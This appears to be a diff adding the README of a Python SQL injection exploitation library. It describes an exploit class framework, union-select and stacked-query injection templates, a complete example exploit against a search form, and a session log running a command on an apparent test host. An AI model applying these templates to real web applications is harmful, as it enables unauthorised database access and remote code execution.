@@ -1,0 +1,115 @@
+################################################################################
+# Python SQL Injection Library
+################################################################################
+
+The purpose of this library is to facililate development of exploits for SQL
+injection vulnerabilities.
+Ready-made payloads are available to each exploit to transform an SQL
+injection into a remote code execution vulnerability.
+When remote code execution is obtained, payloads have been developped for
+dropping a file remotely and executing it.
+
+Currently, supported databases are:
+ - MySQL
+ - SQL Server 2000 & 2005 (& 2007 ?)
+
+################################################################################
+# Exploit development
+################################################################################
+
+An exploit should sub-class the "libsqljack.exploit" object. The exploit
+must then define at least two methods:
+ - place_payload() : Used to place a given payload, and send the HTTP request
+ - parse_result()  : Used to extract the result from the HTTP response
+
+The order in which the exploit methods will be called is the following:
+
+  - __init__                     # Python entry point
+  - run_cli                      # Exploit entry point from command-line
+  - run                          # Generic exploit entry point
+  * parse_args                   # Validate command line options
+  - run                          # Main entry point
+  - loop on generate_payload     # Generate all possible payloads
+    * place_payload              # Place payload and send request
+    * parse_result               # Filter response
+  - get_output                   # Generate final result
+
+Methods marked with a '*' can/should be overidden, depending on your needs.
+
+An exploit must define the "EXPLOIT_TYPE" variable to a supported payload type.
+This must be either "mysql" or "mssql" for the moment.
+
+################################################################################
+# Exploit development - place_payload() method
+################################################################################
+
+Prototype: def place_payload(self, payload)
+
+This method is responsible for placing the SQL injection payload by
+exploiting a given vulnerability. It must take care of building the HTTP
+request, sending it, and store the reply in "self.result"
+
+The "payload" parameter is a python dictionary which may contain two
+different categories of payloads:
+ - xxx_inject
+ - xxx_exec
+
+With "xxx" either "mysql" or "mssql" depending on the exploit type.
+
+The xxx_inject payload should be placed in the field of an SQL injection
+which optionally appears on page. Example:
+
+param = '-1 union select 1,%s,3,4,5' % payload["mssql_inject"]
+
+The xxx_exec payload should be placed somewhere where the whole
+SQL query will be executed. Example:
+
+param = '-1;%s' % payload["mssql_exec"]
+
+################################################################################
+# Complete example exploit code
+################################################################################
+
+class exploit(libsqljack.exploit):
+
+    EXPLOIT_TYPE = "mysql"
+
+    def place_payload(self, payload):
+        POSTDATA = {"page" : "search"}
+        if payload.has_key("mysql_exec"):
+            POSTDATA['query'] = payload["mysql_exec"]
+        elif payload.has_key("mysql_inject"):
+            POSTDATA['id'] = '-1 union select %s' % payload["mysql_inject"]
+        self.result = libsqljack.send_web_request(self.url, POSTDATA)
+        return True
+
+    def parse_result(self, result):
+        matches = re.findall("<span class='res'>(.*)", self.result)
+        if matches:
+            result = matches[0]
+        return super(exploit, self).parse_result(result)
+
+################################################################################
+# Payload development
+################################################################################
+
+Payloads must define the following methods:
+
+  - build_payload          # Build the payload as a python dictionary
+  - parse_result           # Filter the result from the HTTP response
+  - get_output             # Filter/Fetch the final result
+
+The "build_payload" must use the "yield" keyword instead of "return" as it
+will be called in a for loop.
+
+################################################################################
+# Example sessions
+################################################################################
+
+$ python exploit_demo_mssql.py http://auditor-win2k3/pwnasp/backdoor.asp hostname 
+INFO     exploit              - Exploiting host: http://auditor-win2k3/pwnasp/backdoor.asp
+INFO     default              - Executing command ...
+INFO     default              - Fetching command output ...
+INFO     default              - Cleaning temporary data ...
+INFO     exploit              - Exploit result:
+w2k3sp2en
